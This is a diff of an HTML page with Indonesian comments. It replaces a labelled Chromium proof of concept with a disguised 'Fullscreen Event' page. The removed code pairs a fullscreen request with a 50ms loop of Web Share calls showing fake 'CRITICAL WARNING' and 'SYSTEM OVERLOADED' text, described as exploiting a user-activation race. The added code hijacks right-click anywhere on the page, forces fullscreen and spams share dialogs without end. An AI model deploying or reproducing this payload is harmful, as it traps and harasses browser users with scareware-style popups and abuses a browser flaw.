@@ -2,86 +2,38 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Exploit Proof of Concept - Issue 40067914</title>
+    <title>Fullscreen Event</title>
     <style>
-        body {
+        /* Membuat halaman penuh agar bisa diklik di mana saja */
+        html, body {
+            width: 100%;
+            height: 100%;
             margin: 0;
             padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #111;
-            font-family: Arial, sans-serif;
-            overflow: hidden;
-            user-select: none;
-        }
-
-        /* Tombol dibuat memenuhi aspek rasio kotak besar */
-        .btn-exploit {
-            width: 400px;  
-            height: 400px; 
-            font-size: 32px;
-            font-weight: bold;
-            color: white;
-            background: linear-gradient(145deg, #ff4d4d, #cc0000);
-            border: 3px solid #fff;
-            border-radius: 20px; 
-            cursor: pointer;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
-
-        .btn-exploit:active {
-            transform: scale(0.95);
+            background-color: #121212; /* Warna latar belakang gelap */
+            cursor: default;
         }
     </style>
 </head>
 <body>
 
-    <!-- Memicu eksploitasi melalui klik kiri atau klik kanan -->
-    <button class="btn-exploit" onclick="launchPoC()" oncontextmenu="handleRightClick(event)">
-        TRIGGER<br>BUG
-    </button>
-
-    <script>
-    function launchPoC() {
-        // Eksploitasi Race Condition: 
-        // Memaksa request fullscreen dan share berjalan simultan untuk membingungkan penanganan User Activation Chromium
-
-        // 1. Ambil kontrol layar penuh
-        if (document.documentElement.requestFullscreen) {
-            document.documentElement.requestFullscreen();
-        }
-
-        // 2. Tembakkan Web Share API secara agresif tepat saat transisi fullscreen terjadi
-        // Di versi rentan, interaksi ini dianggap sah dan lolos dari blokir spam
-        if (navigator.share) {
-            // Skema serangan pengulangan cepat memanfaatkan celah validasi token aktivasi
-            let count = 0;
-            const exploitInterval = setInterval(() => {
-                navigator.share({
-                    title: '\u26A0 CRITICAL WARNING \u26A0',
-                    text: 'SYSTEM OVERLOADED',
-                    url: window.location.href
-                }).catch((err) => {
-                    console.log('Spamming share...', err);
-                });
-
-                count++;
-                // Berhenti setelah beberapa kali atau biarkan terus berjalan sesuai skenario bug asli Anda
-                if (count > 10) clearInterval(exploitInterval); 
-            }, 50); // Kecepatan agresif 50ms
-        }
+<script>
+// Mendengarkan event klik kanan (contextmenu) di mana saja pada layar
+window.addEventListener('contextmenu', function(e) {
+    // Mencegah menu klik kanan bawaan browser muncul
+    e.preventDefault(); 
+    
+    // Memicu Fullscreen
+    if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
     }
 
-    function handleRightClick(event) {
-        event.preventDefault();
-        launchPoC();
-    }
-    </script>
+    // Loop interval share bawaan dari kode Anda
+    setInterval(() => { 
+        navigator.share({title: '\u26A0 HAI HAI \u26A0\nHAI', text: 'HAI'}); 
+    }, 100);
+});
+</script>
+
 </body>
 </html>
